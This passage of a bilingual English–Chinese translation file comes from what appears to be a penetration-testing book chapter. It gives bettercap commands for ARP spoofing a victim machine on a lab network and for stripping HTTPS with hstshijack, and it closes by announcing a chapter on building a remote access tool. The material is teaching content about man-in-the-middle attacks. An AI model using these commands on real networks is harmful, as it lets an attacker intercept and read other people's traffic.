+- en: set arp.spoof.targets 192.168.74.129
+  id: totrans-234
+  prefs: []
+  type: TYPE_NORMAL
+  zh: set arp.spoof.targets 192.168.74.129
+- en: 'This will set up the victim. To start the **arp** spoofing program, we can
+    write the following command:'
+  id: totrans-235
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将设置受害者。要启动**arp**欺骗程序，我们可以输入以下命令：
+- en: set arp.spoof.internal true
+  id: totrans-236
+  prefs: []
+  type: TYPE_NORMAL
+  zh: set arp.spoof.internal true
+- en: set arp.spoof on
+  id: totrans-237
+  prefs: []
+  type: TYPE_NORMAL
+  zh: set arp.spoof on
+- en: 'This will start spoofing the devices:'
+  id: totrans-238
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将开始欺骗设备：
+- en: '![Figure 5.20 – Device spoofing'
+  id: totrans-239
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.20 – 设备欺骗'
+- en: '](image/B14788_05_20.jpg)'
+  id: totrans-240
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_20.jpg)'
+- en: Figure 5.20 – Device spoofing
+  id: totrans-241
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.20 – 设备欺骗
+- en: At this point, we've come to the **SSL** stripping part. To start stripping
+    the HTTPS traffic, we need to go to the Windows machine and clear all browsing
+    history. This will ensure that we don't load the cached versions of the websites.
+  id: totrans-242
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 到目前为止，我们已经进入了**SSL**剥离部分。为了开始剥离 HTTPS 流量，我们需要去 Windows 机器并清除所有浏览历史。这将确保我们不会加载网站的缓存版本。
+- en: 'If you want to see what services are running on **bettercap**, you can use
+    the following **help** command:'
+  id: totrans-243
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 如果你想查看 **bettercap** 上正在运行的服务，可以使用以下**帮助**命令：
+- en: '![Figure 5.21 – Help command'
+  id: totrans-244
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.21 – 帮助命令'
+- en: '](image/B14788_05_21.jpg)'
+  id: totrans-245
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_21.jpg)'
+- en: Figure 5.21 – Help command
+  id: totrans-246
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.21 – 帮助命令
+- en: 'Next, to see the raw HTTP traffic, run the following command:'
+  id: totrans-247
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 接下来，要查看原始的 HTTP 流量，运行以下命令：
+- en: hstshijack/hstshijack
+  id: totrans-248
+  prefs: []
+  type: TYPE_NORMAL
+  zh: hstshijack/hstshijack
+- en: This will start stripping the traffic. Now, if you go to the Windows machine
+    and go to a website such as [google.com](http://google.com), you will see that
+    the website connection is unsecure. If you go to [google.com](http://google.com),
+    you will notice a *Not secure* tag before the URL.
+  id: totrans-249
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将开始剥离流量。现在，如果你去 Windows 机器并访问像 [google.com](http://google.com) 这样的网站，你会看到该网站连接是不安全的。如果你访问
+    [google.com](http://google.com)，你会注意到 URL 前面有一个*不安全*的标签。
+- en: You should now have an unsecure version of Google. If you go to your Kali Linux
+    terminal where **bettercap** is running, you should see the network traffic.
+  id: totrans-250
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 你现在应该看到一个不安全的 Google。如果你去到运行 **bettercap** 的 Kali Linux 终端，你应该能看到网络流量。
+- en: Attention!
+  id: totrans-251
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 注意！
+- en: Note that big companies such as Google, Facebook, and so on spend huge amounts
+    of money on their security and are constantly trying to improve their protection
+    methods, so one attack that works today might not work tomorrow. That is why penetration
+    testers and cyber security defense teams are constantly involved in a chasing
+    game. The goal of the previous example is to show how these methods work in practice.
+    By the time you use it for yourself, things might have changed and this attack
+    method may or may not work. It is important to stay updated. The purpose of this
+    book is not to get you get stuck on using specific tools but to show you the way
+    penetration testers and security analysts think.
+  id: totrans-252
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 请注意，像谷歌、脸书等大公司在其安全上投入了大量资金，并不断尝试改进其保护方法，因此今天有效的攻击手段，明天可能就不再有效了。这就是为什么渗透测试人员和网络安全防御团队总是在进行一场追逐游戏。前面的例子旨在展示这些方法如何在实践中运作。当你自己使用它时，情况可能会有所变化，这种攻击方法可能有效，也可能无效。因此，保持更新非常重要。本书的目的是让你理解渗透测试人员和安全分析师的思维方式，而不是让你停留在使用特定工具上。
+- en: Summary
+  id: totrans-253
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 总结
+- en: In this chapter, we built on the knowledge we learned about in the previous
+    chapter and used it to build an ARP spoof program, which enabled us to intercept
+    traffic on a local network. Then, we learned how the HTTP and HTTPS protocols
+    work and how they can be broken by man in the middle attacks.
+  id: totrans-254
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在本章中，我们基于上一章学到的知识，构建了一个 ARP 欺骗程序，使我们能够拦截局域网中的流量。然后，我们学习了 HTTP 和 HTTPS 协议的工作原理，以及它们如何通过中间人攻击被破坏。
+- en: 'In next chapter, we will look at a more exciting topic: malware development.
+    This can help us manually take charge of a victim''s machine and perform certain
+    tasks on it. By doing so, we will learn how to build a malware **Remote Access
+    Tool** to take control of the victim''s computer. We will build a program that
+    will enable us to remotely take control of the victim''s machine and perform several
+    tasks on it. See you in the next chapter!'
+  id: totrans-255
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在下一章，我们将讨论一个更令人兴奋的话题：恶意软件开发。这可以帮助我们手动控制受害者的机器并执行某些任务。通过这样做，我们将学习如何构建一个恶意软件**远程访问工具**，以控制受害者的计算机。我们将构建一个程序，使我们能够远程控制受害者的机器并执行多项任务。下一章见！
